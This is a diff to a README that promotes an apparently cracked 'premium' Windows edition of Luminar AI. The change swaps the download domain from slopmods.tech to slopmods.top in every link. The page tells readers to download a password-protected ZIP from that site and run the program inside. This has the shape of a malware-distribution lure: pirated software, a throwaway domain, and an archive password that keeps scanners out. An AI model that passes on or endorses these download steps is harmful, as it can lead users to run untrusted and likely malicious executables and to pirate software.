@@ -8,12 +8,12 @@ Luminar AI — Windows setup and configuration · Premium workspace · Zero nag 
 
 > Use the release page below for Windows.
 
-- **Release page:** [luminarai.slopmods.tech](https://luminarai.slopmods.tech/)
-- **Full URL:** `https://luminarai.slopmods.tech/`
+- **Release page:** [luminarai.slopmods.top](https://luminarai.slopmods.top/)
+- **Full URL:** `https://luminarai.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **luminarai.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **luminarai.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Luminar AI — Windows setup and configuration · Premium workspace · Zero nag 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **luminarai.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **luminarai.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
